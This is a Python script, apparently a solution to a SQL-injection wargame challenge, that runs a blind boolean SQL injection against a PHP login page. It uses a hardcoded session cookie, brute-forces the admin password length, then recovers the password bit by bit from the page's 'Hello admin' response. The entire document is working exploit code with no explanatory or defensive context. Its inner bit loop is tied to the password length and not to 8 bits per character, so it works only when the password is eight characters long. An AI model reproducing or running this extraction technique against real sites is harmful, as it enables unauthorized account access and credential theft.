import requests
url="https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
header={"Cookie":"PHPSESSID=bdjvoop9fovas64ejtr7vo3m4b"}
sess=requests.session()

payload="?pw=' || id='admin' %26%26 length(pw)="
for i in range(1,100):
    pay=url+payload+str(i)+"%23"
    x=sess.get(pay,headers=header)
    print("Check:",i,end=" ")
    
    if "Hello admin" in x.text:
        length=i
        break
    else:
        print("Fail")
print("Success\nlength:",length)


payload="?pw=' || id='admin' %26%26 "
password=''
for i in range(1,length+1):
    bits=''
    print("check:",i,end="")
    for j in range(1,length+1):
        pay=url+payload+"MID(lpad(bin(conv(hex(MID(pw,"+str(i)+",1)),16,10)),8,0),"+str(j)+",1)=1%23"
        x=sess.get(pay,headers=header)
        
        
        if "Hello admin" in x.text:
            bits+='1'
        else:
            bits+='0'
    password+=''.join(chr(int(bits, 2)))
    print("\t",chr(int(bits,2)))
print("Password:"+password)



